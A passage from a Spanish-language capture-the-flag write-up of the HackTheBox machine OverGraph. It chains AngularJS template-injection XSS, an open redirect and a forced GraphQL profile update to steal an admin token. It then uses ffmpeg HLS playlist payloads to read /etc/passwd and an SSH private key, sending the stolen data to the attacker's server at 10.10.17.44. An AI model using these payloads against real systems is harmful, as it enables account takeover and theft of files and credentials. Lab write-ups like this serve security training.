</code></pre></div><p>Como dice el mensaje de Mark, podríamos intentar enviarle una URL como mensaje y ver si accede. El <em>chat</em> está un poco roto, y para enviar mensajes, podemos hacer <em>click</em> en el botón mediante la consola de JavaScript:</p><p><img src="/images/HTB/OverGraph/OverGraph-internal-chat-button.png" alt="OverGraph internal chat button"></p><p>Otra manera es inspeccionando la petición en el navegador y copiándola como comando <code>curl</code>. Algo como esto (el error no importa):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> internal-api.graph.htb/graphql -d <span class="code-dark-yellow">'{"variables":{"to":"mark@graph.htb","text":"asdf"},"query":"mutation ($to: String!, $text: String!) { sendMessage(to: $to, text: $text) { toUserName fromUserName text to from __typename } }"}'</span> -H <span class="code-dark-yellow">'Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTcwYTI5NGUyOThkMDQzNGRkMWJkMiIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzA4NTg5LCJleHAiOjE2NTkzOTQ5ODl9.ZPORWXX7amQ3DBCq4XgQES2peVoZ8NBy7Akjrc1dztc'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>  
{"errors":[{"message":"Cannot read property 'length' of null","locations":[{"line":1,"column":43}],"path":["sendMessage"],"extensions":{"code":"INTERNAL_SERVER_ERROR","exception":{"stacktrace":["TypeError: Cannot read property 'length' of null","    at sendMessage (/home/user/onegraph/backend/graphql/resolvers/message.js:47:56)","    at processTicksAndRejections (internal/process/task_queues.js:95:5)"]}}}],"data":null}
</code></pre></div><p>Y así, podemos enviar un mensaje con nuestra IP como URL, de manera que Mark realiza una petición GET (podemos probar también con inyección HTML, para ver si podemos conseguir XSS fácilmente, pero no):</p><p><img src="/images/HTB/OverGraph/OverGraph-internal-dashboard-mark-url.png" alt="OverGraph internal dashboard Mark URL"></p><p>Y con esto, Mark accede a l URL y recibimos la petición:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 80
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.11.157.
Ncat: Connection from 10.10.11.157:38078.
GET / HTTP/1.1
Host: 10.10.17.44
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Chrome/77
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
Accept-Encoding: gzip, deflate
Accept-Language: en-US
</code></pre></div><p>En este punto, podemos pensar en maneras de obtener <code>adminToken</code>. Asumiendo que <code>adminToken</code> está guardado como una <em>cookie</em> o como una clave en <code>localStorage</code>, finalmente tendremos que conseguir <em>Cross-Site Scripting</em> (XSS) en el navegador de la víctima para poder extraer el valor y enviárnoslo de algún modo.</p><p>Como la aplicación web está realizada con AngularJS (también conocido como Angular 1), es bastante antiguo y se sabe que es vulnerable a <em>Client-Side Template Injection</em> (que deriva en XSS).</p><p>La inyección aparece en <code>firstname</code> y <code>lastname</code>. Esta es una simple prueba de concepto:</p><p><img src="/images/HTB/OverGraph/OverGraph-internal-dashboard-csti.png" alt="OverGraph internal dashboard CSTI"></p><p>Y podemos transformarla a XSS usando el siguiente <em>payload</em> (más información en <a href="https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs">portswigger.net</a>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">{{constructor.constructor('alert(123)')()}}  
</code></pre></div><p><img src="/images/HTB/OverGraph/OverGraph-internal-dashboard-xss.png" alt="OverGraph internal dashboard XSS"></p><h2 id="enumeración-de-graphql">Enumeración de GraphQL</h2><p>Va siendo hora de analizar la implementación de GraphQL. Para esto, podemos usar <a href="https://github.com/swisskyrepo/GraphQLmap"><code>graphqlmap</code></a>. Mediante una consulta de introspección, podemos ver las siguientes estructuras:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./graphqlmap</span> -u http://internal-api.graph.htb/graphql
   _____                 _      ____  _
  / ____|               | |    / __ \| |
 | |  __ _ __ __ _ _ __ | |__ | |  | | |     _ __ ___   __ _ _ __
 | | |_ | '__/ _` | '_ \| '_ \| |  | | |    | '_ ` _ \ / _` | '_ \
 | |__| | | | (_| | |_) | | | | |__| | |____| | | | | | (_| | |_) |
  \_____|_|  \__,_| .__/|_| |_|\___\_\______|_| |_| |_|\__,_| .__/
                  | |                                       | |
                  |_|                                       |_|
                              <span class="code-white">Author</span>: @pentest_swissky <span class="code-white">Version</span>: 1.0
GraphQLmap &gt; dump_via_introspection
============= [SCHEMA] ===============
e.g: <span class="code-green">name</span>[<span class="code-dark-blue">Type</span>]: arg (<span class="code-yellow">Type</span>!)

00: Query
        <span class="code-green">Messages</span>[<span class="code-dark-blue">None</span>]:
        <span class="code-green">tasks</span>[<span class="code-dark-blue">None</span>]: username (<span class="code-yellow">String</span>!),
01: Message
        <span class="code-green">to</span>[<span class="code-dark-blue">String</span>]:
        <span class="code-green">from</span>[<span class="code-dark-blue">String</span>]:
        <span class="code-green">text</span>[<span class="code-dark-blue">String</span>]:
        <span class="code-green">toUserName</span>[<span class="code-dark-blue">String</span>]:
        <span class="code-green">fromUserName</span>[<span class="code-dark-blue">String</span>]:
03: task
        <span class="code-green">Assignedto</span>[<span class="code-dark-blue">ID</span>]:
        <span class="code-green">username</span>[]:
        <span class="code-green">text</span>[<span class="code-dark-blue">String</span>]:
        <span class="code-green">taskstatus</span>[<span class="code-dark-blue">String</span>]:
        <span class="code-green">type</span>[<span class="code-dark-blue">String</span>]:
05: Mutation
        <span class="code-green">login</span>[<span class="code-dark-blue">User</span>]: email (<span class="code-yellow">String</span>!), password (<span class="code-yellow">String</span>!),
        <span class="code-green">update</span>[<span class="code-dark-blue">User</span>]: newusername (<span class="code-yellow">String</span>!), id (<span class="code-yellow">ID</span>!), firstname (<span class="code-yellow">String</span>!), lastname (<span class="code-yellow">String</span>!),  
        <span class="code-green">sendMessage</span>[<span class="code-dark-blue">Message</span>]: to (<span class="code-yellow">String</span>!), text (<span class="code-yellow">String</span>!),
        <span class="code-green">assignTask</span>[]: user (<span class="code-yellow">String</span>!), text (<span class="code-yellow">String</span>!), taskstatus (<span class="code-yellow">String</span>!), type (<span class="code-yellow">String</span>!),
06: User
        <span class="code-green">username</span>[<span class="code-dark-blue">String</span>]:
        <span class="code-green">id</span>[<span class="code-dark-blue">ID</span>]:
        <span class="code-green">email</span>[<span class="code-dark-blue">String</span>]:
        <span class="code-green">createdAt</span>[<span class="code-dark-blue">String</span>]:
        <span class="code-green">token</span>[]:
        <span class="code-green">admin</span>[<span class="code-dark-blue">String</span>]:
        <span class="code-green">adminToken</span>[]:
        <span class="code-green">firstname</span>[]:
        <span class="code-green">lastname</span>[]:
07: __Schema
08: __Type
11: __Field
12: __InputValue
13: __EnumValue
14: __Directive
</code></pre></div><p>Esta consulta no es una vulnerabilidad de GraphQL, sino una funcionalidad. No obstante, se debería deshabilitar por razones de seguridad, ya que muestra toda la estructura de la implementación de GraphQL.</p><p>Existen dos tipos de consultas disponibles:</p><ul><li><code>Messages</code>:</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> internal-api.graph.htb/graphql -d <span class="code-dark-yellow">'{"variables":{},"query":"{ Messages { toUserName fromUserName text to from __typename } }"}'</span> -H <span class="code-dark-yellow">'Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTcwYTI5NGUyOThkMDQzNGRkMWJkMiIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzA4NTg5LCJleHAiOjE2NTkzOTQ5ODl9.ZPORWXX7amQ3DBCq4XgQES2peVoZ8NBy7Akjrc1dztc'</span> -sH <span class="code-dark-yellow">'Content-Type: application/json'</span> | <span class="code-dark-green">jq</span>  
<span class="code-white">{</span>
<span class="code-white">  <span class="code-blue">"data"<span class="code-white">: {</span>
<span class="code-white">    <span class="code-blue">"Messages"<span class="code-white">: [</span>
<span class="code-white">      {</span>
<span class="code-white">        <span class="code-blue">"toUserName"<span class="code-white">: <span class="code-dark-green">"rocky"<span class="code-white">,</span>
<span class="code-white">        <span class="code-blue">"fromUserName"<span class="code-white">: <span class="code-dark-green">"Larry"<span class="code-white">,</span>
<span class="code-white">        <span class="code-blue">"text"<span class="code-white">: <span class="code-dark-green">"Hey, We just realized that this email is not listed in our employee list. Can you send any links or documents so we can verify them on our end? Thanks"<span class="code-white">,</span>
<span class="code-white">        <span class="code-blue">"to"<span class="code-white">: <span class="code-dark-green">"rocky@graph.htb"<span class="code-white">,</span>
<span class="code-white">        <span class="code-blue">"from"<span class="code-white">: <span class="code-dark-green">"larry@graph.htb"<span class="code-white">,</span>
<span class="code-white">        <span class="code-blue">"__typename"<span class="code-white">: <span class="code-dark-green">"Message"</span>
<span class="code-white">      },</span>
<span class="code-white">      {</span>
<span class="code-white">        <span class="code-blue">"toUserName"<span class="code-white">: <span class="code-dark-green">"Larry"<span class="code-white">,</span>
<span class="code-white">        <span class="code-blue">"fromUserName"<span class="code-white">: <span class="code-dark-green">"rocky"<span class="code-white">,</span>
<span class="code-white">        <span class="code-blue">"text"<span class="code-white">: <span class="code-dark-green">"asdf"<span class="code-white">,</span>
<span class="code-white">        <span class="code-blue">"to"<span class="code-white">: <span class="code-dark-green">"larry@graph.htb"<span class="code-white">,</span>
<span class="code-white">        <span class="code-blue">"from"<span class="code-white">: <span class="code-dark-green">"rocky@graph.htb"<span class="code-white">,</span>
<span class="code-white">        <span class="code-blue">"__typename"<span class="code-white">: <span class="code-dark-green">"Message"</span>
<span class="code-white">      },</span>
      ...
<span class="code-white">    ]</span>
<span class="code-white">  }</span>
<span class="code-white">}</span>
</code></pre></div><ul><li><code>tasks</code>:</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> internal-api.graph.htb/graphql -d <span class="code-dark-yellow">'{"variables":{"username":"rocky"},"query":"query tasks($username: String!) { tasks(username: $username) { Assignedto username text taskstatus type __typename } }"}'</span> -H <span class="code-dark-yellow">'Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTcwYTI5NGUyOThkMDQzNGRkMWJkMiIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzA4NTg5LCJleHAiOjE2NTkzOTQ5ODl9.ZPORWXX7amQ3DBCq4XgQES2peVoZ8NBy7Akjrc1dztc'</span> -sH <span class="code-dark-yellow">'Content-Type: application/json'</span> | <span class="code-dark-green">jq</span>  
<span class="code-white">{</span>
<span class="code-white">  <span class="code-blue">"data"<span class="code-white">: {</span>
<span class="code-white">    <span class="code-blue">"tasks"<span class="code-white">: []</span>
<span class="code-white">  }</span>
<span class="code-white">}
</code></pre></div><p>También podemos modificar datos de GraphQL usando mutaciones o <em>mutations</em> (<code>login</code>, <code>update</code>, <code>sendMessage</code> y <code>assignTask</code>). Para poder actualizar los datos de usuario, tenemos que enviar el ID de usuario. Este es nuestro ID de usuario, que aparece en el <em>token</em> JWT:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> eyJpZCI6IjYyZTcyNWMwNGUyOThkMDQzNGRkMWRlOSIsImVtYWlsIjoicm9ja3lfNDI4QGdyYXBoLmh0YiIsImlhdCI6MTY1OTMxNTY0OSwiZXhwIjoxNjU5NDAyMDQ5fQ== | <span class="code-dark-green">base64</span> -d | <span class="code-dark-green">jq</span>  
<span class="code-white">{</span>
<span class="code-white">  <span class="code-blue">"id"<span class="code-white">: <span class="code-dark-green">"62e725c04e298d0434dd1de9"<span class="code-white">,</span>
<span class="code-white">  <span class="code-blue">"email"<span class="code-white">: <span class="code-dark-green">"rocky_428@graph.htb"<span class="code-white">,</span>
<span class="code-white">  <span class="code-blue">"iat"<span class="code-white">: </span>1659315649<span class="code-white">,</span>
<span class="code-white">  <span class="code-blue">"exp"<span class="code-white">: </span>1659402049
<span class="code-white">}
</code></pre></div><p>Y podemos consultar tareas asignadas a Mark para obtener su ID (clave <code>Assignedto</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> internal-api.graph.htb/graphql -d <span class="code-dark-yellow">'{"variables":{"username":"Mark"},"query":"query tasks($username: String!) { tasks(username: $username) { Assignedto username text taskstatus type __typename } }"}'</span> -H <span class="code-dark-yellow">'Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTcwYTI5NGUyOThkMDQzNGRkMWJkMiIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzA4NTg5LCJleHAiOjE2NTkzOTQ5ODl9.ZPORWXX7amQ3DBCq4XgQES2peVoZ8NBy7Akjrc1dztc'</span> -sH <span class="code-dark-yellow">'Content-Type: application/json'</span> | <span class="code-dark-green">jq</span>  
<span class="code-white">{</span>
<span class="code-white">  <span class="code-blue">"data"<span class="code-white">: {</span>
<span class="code-white">    <span class="code-blue">"tasks"<span class="code-white">: [</span>
<span class="code-white">      {</span>
<span class="code-white">        <span class="code-blue">"Assignedto"<span class="code-white">: <span class="code-dark-green">"62e725911b49ab0b7ac8372a"<span class="code-white">,</span>
<span class="code-white">        <span class="code-blue">"username"<span class="code-white">: <span class="code-grey">null<span class="code-white">,</span>
<span class="code-white">        <span class="code-blue">"text"<span class="code-white">: <span class="code-dark-green">"Lorem ipsum"<span class="code-white">,</span>
<span class="code-white">        <span class="code-blue">"taskstatus"<span class="code-white">: <span class="code-dark-green">"completed"<span class="code-white">,</span>
<span class="code-white">        <span class="code-blue">"type"<span class="code-white">: <span class="code-dark-green">"development"</span>
<span class="code-white">      }</span>
<span class="code-white">    ]</span>
<span class="code-white">  }</span>
<span class="code-white">}
</code></pre></div><h2 id="explotación-para-obtener-admintoken">Explotación para obtener <code>adminToken</code></h2><p>Vamos a planear la estrategia:</p><ul><li>El objetivo final es obtener <code>adminToken</code> de Mark, que es muy probable que esté guardado en <code>localStorage</code></li><li>Por tanto, solo el usuario (Mark) puede acceder a esta información desde <code>internal.graph.htb</code> (<code>localStorage</code> solo es accesible desde el mismo dominio en el que se configuró).</li><li>Entonces, la manera de acceder a <code>localStorage</code> tiene que ser con XSS (desde el <em>Client-Side Template Injection</em> de AngularJS en <code>firstname</code> y <code>lastname</code>)</li><li>Para cambiar el <code>firstname</code> de la víctima, tenemos que actualizar su perfil mediante una mutación de GraphQL (<code>update</code>) enviando su ID de usuario</li><li>Podemos obtener el ID de usuario de la víctima con una consulta GraphQL (<code>tasks</code>)</li></ul><p>Perfecto, ahora tenemos que descubrir como forzar a la víctima a que actualice su perfil.</p><p>Aquí tenemos que recordar la vulnerabilidad de <em>Open Redirect</em> presente en <code>http://graph.htb/?redirect=</code>. Podemos usarla para apuntar a nuestra máquina de atacante y cargar un código JavaScript malicioso que realice la mutación <code>update</code>. Pero esto no va a funcionar porque el servidor necesita la <em>cookie</em> <code>auth</code> con un token JWT válido, y la <em>cookie</em> tiene el parámetro <code>httpOnly</code> a <code>true</code> (por lo que no podemos acceder a las <em>cookies</em> desde JavaScript).</p><p>Por tanto, la mutación tiene que realizarse desde el mismo sitio <code>http://graph.htb</code>, de manera que las <em>cookies</em> viajen en la petición. Y esto se puede conseguir ejecutando JavaScrip en línea. Por ejemplo:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">http://graph.htb/?redirect=javascript:eval('alert(123)')  
</code></pre></div><p><img src="/images/HTB/OverGraph/OverGraph-index-xss.png" alt="OverGraph index XSS"></p><p>Y con esto tenemos la manera de decirle al usuario que actualice su perfil (<em>Cross-Site Request Forgery</em>). Solamente tenemos que enviar una URL al chat con el código JavaScript en línea para realizar la mutación. Y esta mutación contendrá el <em>payload</em> de XSS de AngularJS en el campo <code>firstname</code>, de manera que podemos acceder a <code>localStorage</code> y sacar <code>adminToken</code>.</p><p>Para enviar una gran cantidad de código JavaScrip en línea, podemos codificarlo en Base64 y usar <code>javascript:eval(atob`&lt;base64-data>`)</code> (es importante que no aparezcan caracteres <code>=</code> de relleno).</p><p>Este será el código que hará que la víctima actualice su propio perfil con la mutación de GraphQL:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7">fetch</span><span class="mtk1">(</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://internal-api.graph.htb/graphql</span><span class="mtk4">'</span><span class="mtk1">, {</span>
<span class="mtk1">  </span><span class="mtk1">method</span><span class="mtk1">: </span><span class="mtk4">'POST'</span><span class="mtk1">,</span>
<span class="mtk1">  </span><span class="mtk1">credentials</span><span class="mtk1">: </span><span class="mtk4">'include'</span><span class="mtk1">,</span>
<span class="mtk1">  </span><span class="mtk1">mode</span><span class="mtk1">: </span><span class="mtk4">'no-cors'</span><span class="mtk1">,</span>
<span class="mtk1">  </span><span class="mtk1">headers</span><span class="mtk1">: {</span>
<span class="mtk1">    </span><span class="mtk4">'Content-Type'</span><span class="mtk1">: </span><span class="mtk4">'application/json'</span>
<span class="mtk1">  },</span>
<span class="mtk1">  </span><span class="mtk1">body</span><span class="mtk1">: </span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">stringify</span><span class="mtk1">({</span>
<span class="mtk1">    </span><span class="mtk1">variables</span><span class="mtk1">: {</span>
<span class="mtk1">      </span><span class="mtk1">newusername</span><span class="mtk1">: </span><span class="mtk4">'Mark'</span><span class="mtk1">,</span>
<span class="mtk1">      </span><span class="mtk1">id</span><span class="mtk1">: </span><span class="mtk4">'&lt;id&gt;'</span><span class="mtk1">,</span>
<span class="mtk1">      </span><span class="mtk1">firstname</span><span class="mtk1">: </span><span class="mtk4">`&lt;AngularJS XSS&gt;`</span><span class="mtk1">,</span>
<span class="mtk1">      </span><span class="mtk1">lastname</span><span class="mtk1">: </span><span class="mtk4">'asdf'</span>
<span class="mtk1">    },</span>
<span class="mtk1">    </span><span class="mtk1">query</span><span class="mtk1">: </span><span class="mtk4">`</span>
<span class="mtk4">      mutation update($newusername: String!, $id: </span><span class="mtk4">ID!, $firstname: String!, $lastname: String!) {</span>
<span class="mtk4">          update(newusername: $newusername, id: $i</span><span class="mtk4">d, firstname: $firstname, lastname: $lastname) {</span>  
<span class="mtk4">              __typename</span>
<span class="mtk4">          }</span>
<span class="mtk4">      }</span>
<span class="mtk4">    `</span>
<span class="mtk1">  })</span>
<span class="mtk1">})</span>
</code></pre></div><p>Y el <em>payload</em> de XSS de AngularJS será este:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">{{constructor.constructor('fetch("http://10.10.17.44/" + localStorage.getItem("adminToken"))')()}}  
</code></pre></div><p>En este punto, decidí automatizar todo en un <em>script</em> en Python llamado <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/OverGraph/get_admin_token.py"><code>get_admin_token.py</code></a> para probar todo y encadenar correctamente todas las técnicas de explotación web necesarias (explicación detallada <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/OverGraph#get_admin_tokenpy">aquí</a>). Finalmente, obtendremos un <code>adminToken</code> válido:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">get_admin_token.py</span>
[<span class="code-green">+</span>] Logged in as rocky (password: asdffdsa)
[<span class="code-blue">*</span>] JWT token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTdhNmRmNGUyOThkMDQzNGRkMWZjMyIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzQ5MTMwLCJleHAiOjE2NTk0MzU1MzB9.buvUeGkubEoMwDRN-aoH28l2ynIVjdX1HXInWK4mPrM  
[<span class="code-blue">*</span>] Own user ID: 62e7a6df4e298d0434dd1fc3
[<span class="code-green">+</span>] Victim's ID: 62e7a42181fe151459e90ea6
[<span class="code-green">+</span>] Trying to bind to :: on port 80: Done
[<span class="code-green">+</span>] Waiting for connections on :::80: Got connection from ::ffff:10.10.11.157 on port 34196
[<span class="code-blue">*</span>] Closed connection to ::ffff:10.10.11.157 port 34196
[<span class="code-green">+</span>] adminToken: c0b9db4c8e4bbb24d59a3aaffa8c8b83
</code></pre></div><p>Ahora podemos poner este <em>token</em> en <code>localStorage</code> y usar la funcionalidad de subida de vídeos:</p><p><img src="/images/HTB/OverGraph/OverGraph-video-upload.png" alt="OverGraph video upload"></p><h2 id="explotación-de-la-subida-de-archivos-de-vídeo">Explotación de la subida de archivos de vídeo</h2><p>En este punto, podemos deducir que el servidor utiliza <code>ffmpeg</code> para procesar el archivo de vídeo. Existen algunar vulnerabilidades relacionadas con <em>Server-Side Request Forgery</em> y lectura de archivos locales (más información en <a href="https://hackerone.com/reports/1062888">hackerone.com</a> y <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS">PayloadsAllTheThings</a>).</p><p>Para poder leer archivos del servidor (de acuerdo con el informe de <a href="https://hackerone.com/reports/1062888">hackerone.com</a>), tenemos que tener un archivo llamado <code>header.m3u8</code> como este:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0  
#EXTINF:,
http://10.10.17.44?
</code></pre></div><p>Y sin carácter de salto de línea al final. Luego, tenemos que subir un archivo llamado <code>vide.avi</code> (por ejemplo), con el siguiente texto:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://10.10.17.44/header.m3u8|file:///etc/passwd  
#EXT-X-ENDLIST
</code></pre></div><p>Y el <em>payload</em> de arriba servirá para leer la primera línea del archivo <code>/etc/passwd</code> de la máquina con un servidor HTTP:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
::ffff:10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
::ffff:10.10.11.157 - - [] "GET ?root:x:0:0:root:/root:/bin/bash HTTP/1.1" 301 -
::ffff:10.10.11.157 - - [] "GET ?root:x:0:0:root:/?root:x:0:0:root:/root:/bin/bash HTTP/1.1" 301 -  
...
</code></pre></div><p>Para conseguir más datos, tenemos que cambiar el <code>video.avi</code> un poco:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://10.10.17.44/header.m3u8|subfile,,start,1,end,10000,,:/etc/passwd  
#EXT-X-ENDLIST
</code></pre></div><p>Con el <em>payload</em> anterior, estaremos recibiendo datos hasta un caracter de salto de línea, por lo que iremos actualizando el <em>offset</em> <code>start</code> para conseguir más líneas.</p><p>Al tener una vulnerabilidad de lectura de archivos locales, podemos buscar por código fuente y claves privadas de SSH. En lugar de extraer el archivo <code>/etc/passwd</code> al completo para ver usuarios de sistema, podemos causar un fallo en el servidor y ver una traza de error que muestra una ruta absoluta:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> internal-api.graph.htb/api/register -d <span class="code-dark-yellow">'{'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>
&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
&lt;meta charset="utf-8"&gt;
&lt;title&gt;Error&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;pre&gt;SyntaxError: Unexpected end of JSON input&lt;br&gt;    at JSON.parse (&lt;anonymous&gt;)&lt;br&gt;    at parse (/home/user/onegraph/backend/node_modules/body-parser/lib/types/json.js:89:19)&lt;br&gt;    at /home/user/onegraph/backend/node_modules/body-parser/lib/read.js:121:18&lt;br&gt;    at invokeCallback (/home/user/onegraph/backend/node_modules/raw-body/index.js:224:16)&lt;br&gt;    at done (/home/user/onegraph/backend/node_modules/raw-body/index.js:213:7)&lt;br&gt;    at IncomingMessage.onEnd (/home/user/onegraph/backend/node_modules/raw-body/index.js:273:7)&lt;br&gt;    at IncomingMessage.emit (events.js:412:35)&lt;br&gt;    at endReadableNT (internal/streams/readable.js:1334:12)&lt;br&gt;    at processTicksAndRejections (internal/process/task_queues.js:82:21)&lt;/pre&gt;  
&lt;/body&gt;
&lt;/html&gt;

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> internal-api.graph.htb/api/register -d <span class="code-dark-yellow">'{'</span> -sH <span class="code-dark-yellow">'Content-Type: application/json'</span> | <span class="code-dark-green">grep</span> -oE <span class="code-dark-yellow">'/home.*?:'</span>
<span class="code-red">/home/user/onegraph/backend/node_modules/body-parser/lib/types/json.js:</span>
<span class="code-red">/home/user/onegraph/backend/node_modules/body-parser/lib/read.js:</span>
<span class="code-red">/home/user/onegraph/backend/node_modules/raw-body/index.js:</span>
<span class="code-red">/home/user/onegraph/backend/node_modules/raw-body/index.js:</span>
<span class="code-red">/home/user/onegraph/backend/node_modules/raw-body/index.js:</span>
</code></pre></div><p>Vale, entonces <code>user</code> es un usuario válido. En este punto, podemos obtener la <em>flag</em> <code>user.txt</code> usando la subida de archivos de vídeo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
::ffff:10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
::ffff:10.10.11.157 - - [] "GET ?09753d50eb14c51fc58b94afb5eedcc3 HTTP/1.1" 301 -
::ffff:10.10.11.157 - - [] "GET ?09753d50eb14c51fc58b94afb5eedcc3/?09753d50eb14c51fc58b94afb5eedcc3 HTTP/1.1" 301 -  
...
</code></pre></div><p>Para ganar acceso a la máquina, tenemos que extraer el archivo <code>/home/user/.ssh/id_rsa</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.10.11.157 - - [01/Aug/2022 14:19:39] "GET /header.m3u8 HTTP/1.1" 200 -
::ffff:10.10.11.157 - - [01/Aug/2022 14:19:39] "GET /header.m3u8 HTTP/1.1" 200 -
::ffff:10.10.11.157 - - [01/Aug/2022 14:19:40] code 400, message Bad request syntax ('GET ?-----BEGIN OPENSSH PRIVATE KEY----- HTTP/1.1')  
::ffff:10.10.11.157 - - [01/Aug/2022 14:19:40] "GET ?-----BEGIN OPENSSH PRIVATE KEY----- HTTP/1.1" 400 -
